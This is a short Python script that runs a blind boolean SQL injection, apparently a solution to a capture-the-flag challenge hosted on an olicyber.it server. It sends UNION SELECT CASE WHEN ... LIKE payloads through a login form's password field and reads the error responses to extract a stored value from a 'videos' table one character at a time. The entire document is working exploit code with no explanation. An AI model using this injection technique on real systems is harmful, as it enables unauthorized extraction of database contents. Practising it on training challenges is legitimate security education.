import requests,string

URL = 'http://m0lecon-plus.challs.olicyber.it/'

alph = string.ascii_lowercase + string.ascii_uppercase + string.digits + ".{}-?\\_!/\\"



tables = []
table_name = ""
while True:
    print("Table name: ",table_name)
    print("Leaked tables = ",tables)
    for c in alph:
        payload = f"""
        UNION SELECT CASE WHEN (
        (SELECT url 
        FROM videos 
        LIMIT 1 OFFSET 15) 
        LIKE '{table_name}{c}%'
        ) THEN 1 ELSE 0 END --
        """
        payload = '0"' + payload + '"' 
        r = requests.post(URL, data={"username": "admin","password": payload})
        if not "Error" in r.text:
            print("Char found: ",c)
            table_name += c
         
            break
    else:
        break
